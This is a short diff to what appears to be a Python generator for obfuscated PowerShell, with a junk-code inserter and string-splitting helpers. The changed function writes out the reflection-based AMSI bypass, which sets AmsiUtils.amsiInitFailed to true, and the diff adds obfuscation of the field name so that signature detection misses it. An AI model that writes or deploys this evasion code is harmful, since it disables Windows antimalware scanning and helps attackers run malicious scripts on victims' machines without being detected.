@@ -23,13 +23,12 @@ def junk_code():
     return random.choice(j) + "\n"
 
 def amsi_bypass_reflection(var):
-    # Minimal, reliable, and safe for obfuscation later
+    # Only obfuscate field name, not the type name
     return (
         f"${var['amsi_type']} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
-        f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField('amsiInitFailed','NonPublic,Static')\n"
+        f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({split_string('amsiInitFailed')},'NonPublic,Static')\n"
         f"${var['amsi_field']}.SetValue($null,$true)\n"
     )
-
 
 def obf_type(type_name):
     # Returns ([string]'S'+'y'+'s'+'t'+'e'+'m'...)
